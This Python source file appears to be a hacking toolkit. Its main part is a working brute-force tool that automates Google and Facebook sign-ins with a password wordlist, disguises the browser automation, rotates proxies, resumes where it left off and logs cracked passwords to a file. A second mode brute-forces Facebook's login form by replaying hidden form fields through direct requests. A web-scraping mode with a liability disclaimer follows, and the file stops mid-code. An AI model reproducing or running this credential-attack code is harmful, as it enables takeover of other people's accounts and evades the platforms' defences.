
import requests
import time
import re
import os
import sys
import textwrap
import json
import random
import logging
import traceback
import subprocess
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup as beautifulsoup
from data.generate import take_keywords
from data.memory import memory

black = "\033[2;30m"
red = "\033[1;31m"
yellow = "\033[1;33m"
plain = "\033[1;0m"
blue = "\033[1;36m"
dp_blue = "\033[2;34m"
purple = "\033[2;35m"
blue_bg = "\033[1;44m"
red_bg = "\033[1;41m"
green = "\033[1;32m"
  
  
if os.path.exists('data/settings.json'): 
  with open('data/settings.json', 'r') as settingjs:
    set_json = json.load(settingjs)
else:
  os.makedirs('data', exist_ok = True)
  with open('data/settings.json', 'w') as new_setting:
    format_ = {
      "settings": False,
      "proxy": False,
      "username": "",
      "email address": "",
      "password path": "password/passwords.txt"
    }
    json.dump(format_, new_setting, indent = 2)
    new_setting.close()
    print(f'{blue}New setting configured... Kindly restart the program{plain}')
    sys.exit()
    
def proxy_status():
  with open('data/settings.json', 'r') as settings:
    setting = settings.readlines()
    status = set_json["proxy"]
    if status == True:
      return f'{green} ON {plain}'
    else:
      return f'{red} OFF {plain}'
        
def open_settings(modify):
    if set_json["settings"] != False:
      while modify == True:
        setting_var = f'''
        {blue_bg}𝚂𝚎𝚝𝚝𝚒𝚗𝚐{plain}{purple}\n
        [1] 𝙿𝚛𝚘𝚡𝚢                  [4] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚏𝚒𝚕𝚎
        [2] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚞𝚜𝚎𝚛𝚗𝚊𝚖𝚎        [5] 𝚂𝚊𝚟𝚎 𝚜𝚎𝚝𝚝𝚒𝚗𝚐𝚜
        [3] 𝙲𝚑𝚊𝚗𝚐𝚎 𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜
            
        𝙴𝚗𝚝𝚎𝚛 : {plain}'''
        like_to = input(textwrap.dedent(setting_var))
          
        if like_to == "1":
          proxy_setting = set_json["proxy"]
          check_proxy = proxy_status()
          if 'on' in check_proxy.lower():
            new_proxy = input(f'{yellow}Would you like to disable proxy : [Yes | No] : {plain}').lower()
            if new_proxy == 'yes':
              set_json["proxy"] = False
            else:
              set_json["proxy"] = True
          elif 'off' in check_proxy.lower():
            new_proxy = input(f'{yellow}Would you like to enable proxy : [Yes | No] : {plain}').lower()
            if new_proxy == 'yes':
              set_json["proxy"] = True
            else:
              set_json["proxy"] = False
              
        elif "2" in like_to:
          print(f'Current username : {blue}{set_json["username"]}{plain}')
          change_user = input('Would you like to change your username [Yes | No] : ').strip().lower()
          if change_user in ["y", "yes"]:
            new_username = input('Enter your new username : ')
            set_json["username"] = new_username.strip()
          else: 
            pass
        elif "3" in like_to:
          print(f'Your current email: {blue}{set_json["email address"]}{plain}')
          change_email = input('Would you like to change this [Yes | No] : ').lower()
          change_email = change_email.strip()
          if change_email == "yes":
            changing = True
            while changing:
              new_email = input('Enter new email address : \n')
              pattern = r"^[a-zA-Z0-9_+.]+@[a-zA-Z0-9_+]+\.[a-z]{2,3}$"
              if re.search(pattern, new_email):
                set_json["email address"] = new_email.strip()
              else:
                print(f'\n{red_bg}That wasn\'t an email address!!!{plain}')
              changing = False
          elif change_email == "no":
            pass
        elif "4" in like_to:
          try:
            pass_holder = f"""
            Current password file : {set_json["password path"]}
            Your new password file must be located in password folder
            """
            print(f'{blue}{textwrap.dedent(pass_holder)} {plain}')
          except KeyError:
            print(f'{red}No password file found{plain}')
          changing = True
          while changing:
            change = input('Change your password path [Yes | No] : ').lower()
            if change == "yes":
              new_path = input('New password file name [File_name.txt] : ')
              new_path = new_path.strip()
              file, ext =  os.path.splitext(new_path)
              if ext == '.txt':
                if not os.path.exists(f'password/{new_path}'):
                  print(f'{red}{new_path} not found{plain}')
                else:
                  with open(f'password/{new_path}', 'r') as content:
                    cont_ = [line.strip() for line in content.readlines() if line.strip()]
                    if len(cont_) == 0:
                      print(f'{red}{new_path} is an empty document, try again{plain}')
                    else:
                      content.close()
                      set_json["password path"] = f"password/{new_path}"
                      changing = False
              else:
                print(f'{red}Provide a valid .txt document {plain}')
            else:
              changing = False
        elif "5" in like_to:
          with open('data/settings.json', 'w') as setting_con:
            json.dump(set_json,setting_con,indent = 4)
            setting_con.close()
            modify = False
        elif 'exit' in like_to:
          modify = False
  
    
def check_connection():
  try:
    response = requests.get('https://github.com', timeout = 10)
    if response.status_code == 200:
      return f'{green}𝙾𝚗𝚕𝚒𝚗𝚎{plain}'
  except Exception:
    return f'{red}𝙾𝚏𝚏𝚕𝚒𝚗𝚎{plain}'
    
def is_web_address(value):
  full_path = r'(http)s?\:\/\/(\w+\.)*[a-z]+\/?[\w\d\S&#?$€¥¢:=%+]*'
  if re.search(full_path, value):
    return True
      
  return False
  
def onload_proxy(data = None, pop = None):
  with open('data/settings.json', 'r') as set_:
    setting = set_.readlines()[2]
    proxy, status = setting.split(':')
    if "true" in status:
      with open('data/proxy.txt', 'r') as proxfile:
        proxy = [line.strip() for line in proxfile.readlines() if line.strip()]
        if pop is not None and pop in proxy:
          proxy.remove(pop)
          
        if not proxy:
          return None
            
        this_proxy = random.choice(proxy)
        if len(this_proxy.split(':')) == 3:
          address,port,protocol = this_proxy.split(':')
          if all((address,port,protocol)):
            if data == dict:
              return {protocol : f'{protocol}://{address}:{port}'}
            else:
              return f'{protocol}://{address}:{port}'
        else:
          user,pass_,address,port,protocol = this_proxy.split(':')
          if all((user,pass_,address,port)):
            if data == dict:
              return {protocol : f'{protocol}://{user}:{pass_}@{address}:{port}'}
            else:
              return f'{protocol}://{user}:{pass_}@{address}:{port}'
    else:
      set_.close()
      return None

def onload_file():
  new_value = set_json["password path"]
  if not os.path.exists(new_value):
    return 'password/passwords.txt'
  else:
    return f'{new_value}'
  
  
def proxy_errorV(errorLogged = None, terminate = None):
  if errorLogged != None:
    if 'net::ERR_SOCKS_CONNECTION_FAILED' in errorLogged:
      logging.error(errorLogged)
      print(f'{red}Socks connection failed{plain}')
    if 'net::ERR_PROXY_CONNECTION_FAILED' in errorLogged:
      onload_proxy(pop = terminate)
      logging.error(errorLogged)
      print(f'{red}Proxy connection failed{plain}')
    if 'net::ERR_CONNECTION_CLOSED' in errorLogged:
      logging.warning(errorLogged)
      print(f'{red}No internet connection{plain}')
    else:
      print(errorLogged)


def main():
  os.system('cls' if os.name == 'nt' else 'clear')
  password_file = set_json["password path"]
  logging.basicConfig(filename='monster.log', format = "%(asctime)s - %(levelname)s - %(message)s")
  
  #makes dictionary loading dynamic
  def run_brute():
    with open(onload_file(), 'r') as file:
      pass_ = [passw.strip() for passw in file.readlines() if passw.strip()]
      return pass_
    
  save_passwords = open('data/temps.txt', 'a')
    
  def load_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    holder = rf"""
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   _,  _ _, _ _,_ _  ,   _, _  _, _, _  _, ___ __, __,
   |   | |\ | | | '\/    |\/| / \ |\ | (_   |  |_  |_)
   | , | | \| | |  /\    |  | \ / | \| , )  |  |   | \
   ~~~ ~ ~  ~ `~' ~  ~   ~  ~  ~  ~  ~  ~   ~  ~~~ ~ ~
                                     {dp_blue}𝙱𝚎 𝚝𝚑𝚎    𝚖𝚘𝚗𝚜𝚝𝚎𝚛{blue}
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜                       𝙿𝚛𝚘𝚡𝚢 - {proxy_status()}
   
   {dp_blue}𝙱𝚛𝚞𝚝𝚎-𝚏𝚘𝚛𝚌𝚎                    {dp_blue}𝙿𝚊𝚢𝚕𝚘𝚊𝚍
   {green}𝙷𝚝𝚖𝚕-𝚜𝚔𝚒𝚗𝚗𝚎𝚛                   {green}𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛
   {yellow}𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜                       𝙷𝚎𝚕𝚙
   {plain}𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍                       𝙴𝚡𝚒𝚝 
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   {blue_bg}𝙶𝚒𝚝𝚑𝚞𝚋 - 𝚜𝚑𝚊𝚍𝚎[𝚑𝚊𝚛𝚔𝚎𝚛𝚋𝚢𝚝𝚎]{plain}     𝚂𝚝𝚊𝚝𝚞𝚜 - {check_connection()}
   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    """
  
    print(f'{blue}{textwrap.dedent(holder)}{plain}')
  load_banner()
  bs = beautifulsoup
  command = True
  while command:
    command = input(f'{yellow}[{blue} 𝙼𝚊𝚒𝚗-𝚖𝚎𝚗𝚞{yellow} ]𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : {plain}')
    command = command.strip()
    if command.lower() in ['brute', 'brute-force']:
      if set_json["proxy"]:
        temp_disable = input(f'{blue}𝚃𝚎𝚖𝚙𝚘𝚛𝚊𝚛𝚒𝚕𝚢 𝚍𝚒𝚜𝚊𝚋𝚕𝚎 𝚙𝚛𝚘𝚡𝚢 𝚏𝚘𝚛 𝚗𝚘𝚠 [𝚈𝚎𝚜 | 𝙽𝚘] : {plain}').lower()
        disable_now = True if temp_disable.strip() == "yes" else False
      br = True
      while br:
        target = """
        𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚝𝚎𝚖𝚙𝚕𝚊𝚝𝚎𝚜
        
        [1] 𝙶𝚘𝚘𝚐𝚕𝚎    [2] 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔 
        [3] 𝙴𝚡𝚒𝚝
        
        """
        print(blue+textwrap.dedent(target)+plain)
        options = webdriver.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-gpu')
        options.add_argument('--incognito')
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        tar = input(f'{yellow}>>> ').lower()
        if tar in ['google','1']:
          options.add_argument("--disable-blink-features=AutomationControlled")
          caught_proxy = onload_proxy()
          if caught_proxy != None and disable_now == False:
            options.add_argument('--proxy-server=127.0.0.1:8000')
            options.add_argument('ignore-certificate-errors')
            sign_in_tar = 'http://127.0.0.1:8000/accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
          
          sign_in_tar = 'https://accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
          
          email_or_phone = input(f'{yellow}𝙴𝚖𝚊𝚒𝚕 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 >>> {plain}')
          if email_or_phone.lower() in ['exit']:
            break 
          read_mem = memory(email_or_phone,1,None,onload_file())
          index_h = read_mem.read_()
          i = index_h if index_h != None else 0
          pass_ = run_brute()
          while i < len(pass_):
            check_password = pass_[i]
            driver = webdriver.Chrome(options = options)
            try:
              driver.get(sign_in_tar)
              time.sleep(5)

              wait = WebDriverWait(driver, 60)
              page_source = driver.page_source
              page_ = bs(page_source, 'html.parser')
              if 'Error' in page_.text:
                print(page_)
              
              print(f'{green}𝚃𝚛𝚢𝚒𝚗𝚐 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : {check_password}{plain}')
              target_email = driver.find_element(By.CSS_SELECTOR, 'input[name="identifier"]')
              
              target_email.send_keys(email_or_phone)
              wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
              driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
              captcha = []
              wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[type="password"]')))
              target_password = driver.find_element(By .CSS_SELECTOR,'input[type="password"]')
                
              target_password.send_keys(check_password)
              wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
              driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
              wait.until(EC.visibility_of_element_located((By.XPATH, '//span[contains(text(), "Wrong password")]')))
                
              print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 {plain}', flush = True)
              save_mem = memory(email_or_phone,1,check_password,onload_file())
              save_mem.update_()
              driver.quit()
            except selenium.common.exceptions.TimeoutException:
                
              page_now = bs(driver.page_source, 'html.parser').text
               
              if r"find your Google Account" in page_:
                print(f'{red}Couldn\'t find the google account {email_or_phone}{plain}')
                driver.quit()
                break
              elif r"Enter a valid email or phone number" in page_:
                print(f'{red}Enter a valid email or phone number{plain}')
                driver.quit()
                break
                  
              elif "Confirm that you’re not a robot" in page_now:
                captcha.extend(check_password)
                print(f'{red}Captcha detected {plain}')
                if len(captcha) > 5:
                  print(f'{red}The server keeps calling me a bot, i shall go to sleep now💤...You should too{plain}')
                  driver.quit()
                  break
  
              elif r"You're signed in" in page_now or   r"Recovery information" in page_now or r'2-step verification' in page_now or 'Account recovery' in page_now:
                print(f'{green}Correct password : {check_password}{plain}')
                driver.quit()
                save_passwords.write(f'{username_email} - {check_password} - Google - {time.time()}\n')
                del_mem = memory(email_or_phone,1,None,None)
                del_mem.terminate_()
                break
              else:
                print(f'{yellow}Await response timeout - slow internet connection{plain}')
            except Exception:
              track = traceback.format_exc()
              proxy_errorV(errorLogged = track, terminate = caught_proxy)
              driver.quit()
            except KeyboardInterrupt:
              driver.quit()
              print(f'{red}Session terminated{plain}')
              break
            finally:
              driver.quit()
              
            driver.quit()
            i += 1
            
          del_mem = memory(email_or_phone,1,None,None)
          del_mem.terminate_()
            
           
        if tar in ['facebook','2']:
          username_email = input(f'{yellow}[𝙴𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛] >>> {plain}')
          if username_email.lower() in ['exit']:
            break
          caught_proxy = onload_proxy()
          if caught_proxy != None and disable_now == False:
            options.add_argument('--proxy-server=127.0.0.1:8000')
            options.add_argument('ignore-certificate-errors')
            sign_in_face = 'http://127.0.0.1:8000/https://m.facebook.com/?rcs=ATA8kUHTRamaHaCJtN302QdoJ--JpWwH6lhmnM2RoDZg4Qhlcjh4PXiAKViPL4Cqs4ny1uovx6g5QLOJbR6VAF7SXHQXmUb_b57xLaow_r7XeSdpxp9z8mwJ5ULrsncUrrFS7HRi4wYpaaEfoY-ekIzQ2y-mhoIxIN8FnA'
            
            
          sign_in_face = 'https://m.facebook.com/?rcs=ATA8kUHTRamaHaCJtN302QdoJ--JpWwH6lhmnM2RoDZg4Qhlcjh4PXiAKViPL4Cqs4ny1uovx6g5QLOJbR6VAF7SXHQXmUb_b57xLaow_r7XeSdpxp9z8mwJ5ULrsncUrrFS7HRi4wYpaaEfoY-ekIzQ2y-mhoIxIN8FnA'
          read_mem = memory(username_email,2,None,onload_file())
          index_h = read_mem.read_()
          i = index_h if index_h != None else 0
          pass_ = run_brute()
          while i < len(pass_):
            check_password = pass_[i]
            driver = webdriver.Chrome(options = options)
            try:
              driver.get(sign_in_face)
              time.sleep(5)
              page_ = bs(driver.page_source, 'html.parser').text
              if r"This site can’t be reached" in page_:
                print(f'{red}Facebook can\'t be reached at the moment{plain}')
                driver.quit()
                break
                  
              if r"temporarily blocked" not in page_:
                if 'Error' in page_:
                  print(red+page_+plain)
                  break
                      
                wait = WebDriverWait(driver,60)
                wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[placeholder="Email address or phone number"]')))
              
                username_field = driver.find_element(By.CSS_SELECTOR,
                'input[placeholder="Email address or phone number"]')
    
                password_field = driver.find_element(By.CSS_SELECTOR,
                'input[type="password"]')
              
                username_field.send_keys(username_email)
                password_field.send_keys(check_password)
                
                print(f'{green}[{username_email}] 𝚃𝚛𝚢𝚒𝚗𝚐 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : {check_password}{plain}', flush = True)
                
                wait.until(EC.visibility_of_element_located((By.XPATH, '//button[contains(text(), "Log in")]')))
                driver.find_element(By.XPATH,'//button[contains(text(), "Log in")]').click()
                try:
                    
                  wait.until(EC.visibility_of_element_located((By.XPATH, '//div[contains(text(), "incorrect")]')))
                  page_content = bs(driver.page_source, 'html.parser').text
                  if "incorrect" in page_content:
                    print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}', flush = True)
                    driver.quit()
                    save_mem = memory(username_email,2,check_password,onload_file())
                    save_mem.update_()
                except selenium.common.exceptions.TimeoutException as sel_timer:
                  page_now = bs(driver.page_source, 'html.parser').text
                  if "Find your account" in page_now:
                    print(f'{red}Couldn\'t find the account {username_email}{plain}')
                    driver.quit()
                    break
                  if "Check your notifications on  another device" in page_now:
                    print(f'{yellow}Correct password {check_password} [ might have 2 factor authentication {plain}]', flush = True)
                    driver.quit()
                    save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
                    del_mem = memory(username_email,2,None,None)
                    del_mem.terminate_()
                    break
                  if  'Find friends' in page_now or 'authentication' in page_now or 'recovery information' in page_now or 'Check your notifications' in page_now:
                    print(f'{yellow} {check_password} is the correct password{plain}')
                    driver.quit()
                    save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
                    del_mem = memory(username_email,2,None,None)
                    del_mem.terminate_()
                  if 'Enter the characters' in page_now:
                    print(f'{red}Captcha detected{plain}')
                    driver.quit()
                    break
                  else:
                    logging.critical(sel_timer)
                    print(f'{yellow}Await response timeout - slow internet connection{plain}')
                    driver.quit()
                    pass
                    
                except selenium.common.exceptions.NoSuchElementException as sel_err:
                  logging.critical(sel_err)
                  print(f'{red}Kindly inform the developer of this error, once spotted{plain}')
                  driver.quit()
              else:
                print(f'{red}Requests have been temporarily blocked{plain}')
                driver.quit()
            except Exception:
              track = traceback.format_exc()
              proxy_errorV(errorLogged = track, terminate = caught_proxy)
              driver.quit()
              break
            except KeyboardInterrupt:
              driver.quit()
              print(f'{red}Session terminated{plain}')
              break
            finally:
              driver.quit()
              
            driver.quit()
            i += 1
          
          del_mem = memory(username_email,2,None,None)
          del_mem.terminate_()
        
          
        elif tar in ['exit','3']:
          br = False
    elif command.lower() == 'payload':
      payload = True
      while payload:
        holder = """\n
        𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚝𝚎𝚖𝚙𝚕𝚊𝚝𝚎𝚜
        [1] 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔
      
        𝙲𝚞𝚛𝚛𝚎𝚗𝚝  :- 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔
        """
        print(blue+textwrap.dedent(holder)+plain)
        username_email = input(f'{yellow}𝙴𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 >>> {plain}')
        if username_email.lower() in ['exit']:
          break 
          payload = False
      
        target_url = 'https://www.facebook.com/login.php/?wtsid=rdr_0f3dD3Sv9vasSu1yl&_rdc=2&_rdr#'
        i = 0
        pass_ = run_brute()
        while i < len(pass_):
          try:
            check_password = pass_[i]
            agent = {
              "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/537.36",
              "Content-Type" : "Html"
            }
            caught_proxy = onload_proxy(data = dict)
            response = requests.get(target_url, proxies = caught_proxy)
            cookies = {i.name : i.value for i in response.cookies}
        
            target_ = bs(response.text, 'html.parser')
            post_url = target_.find('form', attrs = {'action' : True}).get('action')
            hidden_input = target_.find_all('input', attrs = {'type' : 'hidden'})
            made_data = {}
            for input_tag in hidden_input:
              name = input_tag.get('name')
              value = input_tag.get('value', '')
              if name != None:
                made_data.update({f'{name}' : f'{value}'})
            
            form = target_.find_all('form')
            if form:
              made_data.update({'name':f'{username_email}'})
              made_data.update({'pass': f'{check_password}'})
          
              data_sent = requests.post(f'{response.url}{post_url}', data = made_data, cookies = cookies, headers = agent, proxies = caught_proxy)
          
              data_sent = bs(data_sent.text, 'html.parser').text
              print(f'{green}Trying password : {check_password} {plain}')
          
              if 'Find friends' in data_sent or 'Check your notifications on another device' in data_sent or 'authentication' in data_sent:
                print(f'{green}[{username_email}] Password found : {check_password} {plain}')
                save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
                break
                payload = False
              elif 'Find account' in data_sent:
                print(f'{red}Couldn\'t find the account {username_email}{plain}')
                break
                payload = False
          
            i += 1
          except KeyboardInterrupt:
            payload = False
            break
          except Exception as error:
            print(f'{red}{error}{plain}')
    elif command.lower() in ['html-skinner', 'html']:
      skinning = True
      while skinning:
        website = input(f'{yellow}𝚆𝚎𝚋 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 >>> {plain}').strip()
        if website.lower() == 'exit':
          skinning = False
          
        if is_web_address(website):
          try:
            caught_proxy = onload_proxy(data = dict)
            
            response = requests.get(website, proxies = caught_proxy, timeout = 30)
            
            if response.status_code == 200:
              beauty = bs(response.text, 'html.parser')
              helper = fr"""
              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                𝙲𝚘𝚖𝚖𝚘𝚗  𝚑𝚝𝚖𝚕  𝚝𝚊𝚐𝚜 
              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
              𝙿𝚊𝚐𝚎 𝚑𝚎𝚊𝚍 - 𝚑𝚎𝚊𝚍,
              𝙿𝚊𝚐𝚎 𝚝𝚒𝚝𝚕𝚎 - 𝚝𝚒𝚝𝚕𝚎,
              𝙿𝚊𝚐𝚎 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 - 𝚋𝚘𝚍𝚢,
              𝙻𝚒𝚗𝚔𝚜 - 𝚊,
              𝙿𝚊𝚛𝚊𝚐𝚛𝚊𝚙𝚑 - 𝚙,
              𝙵𝚘𝚛𝚖 - 𝚏𝚘𝚛𝚖 ,
              𝙸𝚗𝚙𝚞𝚝 - 𝚒𝚗𝚙𝚞𝚝,
              𝙱𝚞𝚝𝚝𝚘𝚗 - 𝚋𝚞𝚝𝚝𝚘𝚗,
              𝙱𝚘𝚕𝚍 𝚝𝚎𝚡𝚝𝚜 - 𝚋,
              𝙸𝚝𝚊𝚕𝚒𝚌 𝚝𝚎𝚡𝚝𝚜 - 𝚒,
              𝚍𝚒𝚟.𝚑𝚒 - 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚜 𝚍𝚒𝚟 𝚠𝚒𝚝𝚑 𝚝𝚑𝚎 𝚌𝚕𝚊𝚜𝚜 [𝚑𝚒],
              𝚍𝚒𝚟#𝚑𝚒 - 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚜 𝚍𝚒𝚟 𝚠𝚒𝚝𝚑 𝚝𝚑𝚎 𝚒𝚍 [𝚑𝚒],
              𝚍𝚒𝚟>𝚊𝚝𝚝𝚛=𝚟𝚊𝚕𝚞𝚎 - >𝚊𝚝𝚝𝚛𝚒𝚋𝚞𝚝𝚎 [𝚝𝚢𝚙𝚎, 𝚒𝚍]
                =𝚟𝚊𝚕𝚞𝚎 [𝚑𝚒𝚍𝚍𝚎𝚗, 𝚌𝚑𝚎𝚌𝚔𝚎𝚍],
              𝙴𝚗𝚍 𝚠𝚒𝚝𝚑 ,-𝚜𝚊𝚟𝚎.𝚑𝚝𝚖𝚕 𝚝𝚘 𝚜𝚊𝚟𝚎 𝚝𝚑𝚎 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚎𝚕𝚎𝚖𝚎𝚗𝚝𝚜 𝚒𝚗 𝚊 𝚏𝚒𝚕𝚎 𝚗𝚊𝚖𝚎𝚍 𝚜𝚊𝚟𝚎.𝚑𝚝𝚖𝚕 𝚘𝚝𝚑𝚎𝚛𝚠𝚒𝚜𝚎 [-𝚏𝚒𝚕𝚎_𝚗𝚊𝚖𝚎.𝚑𝚝𝚖𝚕] 
              
              {red}
              𝙳𝚒𝚜𝚌𝚕𝚊𝚒𝚖𝚎𝚛 - 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚒𝚜 𝚝𝚘𝚘𝚕 𝚝𝚘 𝚜𝚌𝚛𝚊𝚙𝚎 𝚍𝚊𝚝𝚊 𝚏𝚛𝚘𝚖 𝚊𝚗𝚢 𝚠𝚎𝚋𝚜𝚒𝚝𝚎 𝚠𝚒𝚝𝚑𝚘𝚞𝚝 𝚝𝚑𝚎 𝚘𝚠𝚗𝚎𝚛'𝚜 𝚌𝚘𝚗𝚜𝚎𝚗𝚝 𝚖𝚊𝚢 𝚟𝚒𝚘𝚕𝚊𝚝𝚎 𝚊𝚙𝚙𝚕𝚒𝚌𝚊𝚋𝚕𝚎 𝚕𝚊𝚠𝚜 𝚊𝚗𝚍 𝚝𝚎𝚛𝚖𝚜 𝚘𝚏 𝚜𝚎𝚛𝚟𝚒𝚌𝚎. 𝙰𝚜 𝚝𝚑𝚎 𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛, 𝚒 𝚍𝚒𝚜𝚌𝚕𝚊𝚒𝚖 𝚊𝚗𝚢 𝚕𝚒𝚊𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚗 𝚑𝚘𝚠 𝚝𝚑𝚒𝚜 𝚝𝚘𝚘𝚕 𝚒𝚜 𝚞𝚜𝚎𝚍. 𝚄𝚜𝚎𝚛𝚜 𝚊𝚛𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚕𝚎 𝚠𝚒𝚝𝚑 𝚎𝚗𝚜𝚞𝚛𝚒𝚗𝚐 𝚌𝚘𝚖𝚙𝚕𝚒𝚊𝚗𝚌𝚎 𝚠𝚒𝚝𝚑 𝚕𝚎𝚐𝚊𝚕 𝚊𝚗𝚍 𝚎𝚝𝚑𝚒𝚌𝚊𝚕 𝚐𝚞𝚒𝚍𝚎𝚕𝚒𝚗𝚎𝚜. 𝙿𝚛𝚘𝚌𝚎𝚎𝚍 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚕𝚢 
              
              {blue}
              -𝚂𝚑𝚊𝚍𝚎 
              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
              """
              help_example = ['𝚝𝚒𝚝𝚕𝚎, 𝚊, 𝚋𝚞𝚝𝚝𝚘𝚗']
            
              print(f'\n{blue}{textwrap.dedent(helper)}{plain}\n')
     
              provide_web = True
              while provide_web:
                html_extract = input (f'[{blue}{response.url}{plain}]\n{yellow}𝙻𝚎𝚝\'𝚜 𝚜𝚌𝚛𝚊𝚙𝚎 𝚜𝚘𝚖𝚎 𝚎𝚕𝚎𝚖𝚎𝚗𝚝𝚜 {help_example}: '+plain).lower()
                
                if html_extract.lower() == 'exit':
                  provide_web = False
                  skinning = False
                
            
                elements_extracted = []
                if not html_extract.endswith(','):
                  html_extract = html_extract+','
              
                i = 0
                list_to_extract = html_extract.split(',')
                if '' in list_to_extract:
                    list_to_extract.remove('')
             
                for each_element in list_to_extract:
                  if each_element not in  ['.', '#', '>=']:
                    elements_extracted.extend(beauty.find_all (each_element))
                  
                  if '.' in each_element:
                    tag, tag_class = each_element.split('.',1)
                    elements_extracted.extend(beauty.find_all(tag, class_ = tag_class))
              
                  if '#' in each_element:
                    tag, tag_id = each_element.split('#',1)
                    elements_extracted.extend(beauty.find_all(tag , id = tag_id))
                  
                  if '>' in each_element:
                    if '=' in each_element:
                      tag,tag_attr = each_element.split('>',1)
                      tag_attr, tag_value = tag_attr.split('=',1)
                      elements_extracted.extend(beauty.find_all(tag, attrs = {tag_attr : tag_value}))
                    else:
                      tag,tag_attr = each_element.split('>',1)
                      elements_extracted.extend(beauty.find_all(tag, attrs = {tag_attr : True}))
                      
                  if each_element.startswith('-'):
                    file_name = each_element[1:]
                    if not os.path.exists('cache/skinner'):
                      print(f'{red}Parent folder not found{plain}')
                    
                    with open(f'cache/skinner/{file_name}', 'w') as file:
                      j = 0
                      while j < len(elements_extracted):
                        file.write(f'{bs.prettify(elements_extracted[j])}\n')
                        j += 1
                  
                  for element in elements_extracted:
                    print(bs.prettify(element))
                  
                  if '-' in list_to_extract[-1:][0]:
                    print(f'{yellow}𝙵𝚒𝚕𝚎 𝚜𝚊𝚟𝚎𝚍, 𝚝𝚘 𝚘𝚙𝚎𝚗 : [𝚌𝚊𝚝 𝚌𝚊𝚌𝚑𝚎/𝚜𝚔𝚒𝚗𝚗𝚎𝚛/𝚏𝚒𝚕𝚎_𝚗𝚊𝚖𝚎]\n{plain}')
                    
                  if not html_extract.lower() == 'exit':
